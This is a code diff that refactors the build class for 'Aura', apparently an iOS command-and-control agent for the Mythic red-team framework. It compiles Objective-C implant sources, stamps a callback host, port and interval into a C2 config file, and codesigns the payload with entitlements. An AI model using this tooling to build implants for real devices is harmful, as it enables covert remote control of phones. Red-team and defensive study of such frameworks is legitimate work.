@@ -33,30 +33,39 @@ class Aura(PayloadType):
         BuildStep(step_name="Signing entitlements", step_description="Signing entitlements to the payload."),
     ]
 
+    sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
+    clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
+
     async def build(self) -> BuildResponse:
         resp = BuildResponse(status=BuildStatus.Success)
 
         try:
-            sdk_path, clang_compiler_path, objc_flags = await self._get_build_settings()
+            # If the payload already exists, then delete it
+            if os.path.exists(self.aura_payload_path):
+                os.remove(self.aura_payload_path)
 
-            await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)
+            # Validate build settings
+            await self._validate_build_settings()
 
+            # C2 Profile Configuration
             params = self._extract_c2_parameters()
+            await self._create_http_config(params)
 
-            self._create_http_config(params)
-
+            # Compilation
             os.makedirs(f"{self.build_path}", exist_ok=True)
-
-            compile_link_cmd = self._generate_compile_command(clang_compiler_path, objc_flags, sdk_path)
+            compile_link_cmd = self._generate_compile_command()
+            print(f"\n{compile_link_cmd}\n")
             await self._run_command(compile_link_cmd, "Compiling and Linking Objective-C", resp)
 
+            # Codesigning the base entitlements
             codesign_command = self._generate_codesign_command()
             await self._run_command(codesign_command, "Signing entitlements", resp)
 
+            # If the payload was successfully built, read it into memory and attach it to the response
             if os.path.exists(self.aura_payload_path):
                 resp.payload = open(self.aura_payload_path, "rb").read()
 
-            resp.build_message = "Successfully built and signed Aura payload!"
+            resp.build_message = "🥳 Successfully built and signed Aura payload!"
             resp.status = BuildStatus.Success
 
         except Exception as e:
@@ -65,21 +74,20 @@ class Aura(PayloadType):
 
         return resp
 
-    async def _get_build_settings(self):
-        sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
-        clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
-        objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
-        
+    async def _validate_build_settings(self):
+        failed = False
         # Check if paths exist
-        if not pathlib.Path(sdk_path).exists():
-            await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {sdk_path}", False)
+        if not pathlib.Path(self.sdk_path).exists():
+            failed = True
+            await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {self.sdk_path}", False)
         
         # Check if clang compiler exists
-        if not pathlib.Path(clang_compiler_path).exists():
-            await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {clang_compiler_path}", False)
+        if not pathlib.Path(self.clang_compiler_path).exists():
+            failed = True
+            await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {self.clang_compiler_path}", False)
         
-        return sdk_path, clang_compiler_path, objc_flags
-
+        if not failed:
+            await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)
 
     async def _update_build_step(self, step_name, step_stdout, step_success):
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -94,7 +102,7 @@ class Aura(PayloadType):
         print(f"\n\nPARAMS: {params}\n\n")
         return params
 
-    def _create_http_config(self, params):
+    async def _create_http_config(self, params):
         callback_host = params.get("callback_host", "localhost")
         callback_port = params.get("callback_port", 80)
         callback_interval = params.get("callback_interval", 10)
@@ -185,8 +193,10 @@ class Aura(PayloadType):
 """
         with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
             objc_file.write(config_objc_code)
+        
+        await self._update_build_step("Configuring C2", "Successfully stamped C2 config.", True)
 
-    def _generate_compile_command(self, clang_compiler_path, objc_flags, sdk_path):
+    def _generate_compile_command(self):
         source_files = [
             "main.m",
             "C2CheckIn.m",
@@ -196,10 +206,11 @@ class Aura(PayloadType):
         ]
 
         source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
+        objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
         return (
-            f"{clang_compiler_path} {objc_flags} "
+            f"{self.clang_compiler_path} {objc_flags} "
             f"-target arm64-apple-ios12.0 -v "
-            f"-isysroot {sdk_path} "
+            f"-isysroot {self.sdk_path} "
             f"-I {self.agent_code_path}/c2_profiles "
             f"{source_file_paths} "
             f"-framework Foundation -framework UIKit -lobjc "
@@ -211,14 +222,27 @@ class Aura(PayloadType):
         return f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"
 
     async def _run_command(self, command, step_name, resp):
-        print(f"\n{command}\n")
+        # Print the command being run for better logging
+        print(f"\nRunning command for {step_name}:\n{command}\n")
+
+        # Use subprocess to run the command and capture both stdout and stderr
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
 
+        # Log the output from the command
+        if stdout:
+            print(f"STDOUT from {step_name}: {stdout.decode()}")
+        if stderr:
+            print(f"STDERR from {step_name}: {stderr.decode()}")
+
+        # If the command fails, capture and log the error
         if process.returncode != 0:
-            await self._update_build_step(step_name, f"Failed to {step_name}", False)
+            error_message = f"Error during {step_name}:\n{stderr.decode()}"
+            print(error_message)  # Print to console for additional logging
+            await self._update_build_step(step_name, error_message, False)
             resp.set_status(BuildStatus.Error)
-            resp.build_message = f"Error during {step_name}:\n{stderr.decode()}"
-            return resp
+            resp.build_message = error_message
         else:
-            await self._update_build_step(step_name, f"Successfully {step_name}", True)
+            success_message = f"Successfully completed {step_name}"
+            print(success_message)  # Print success message to console
+            await self._update_build_step(step_name, success_message, True)
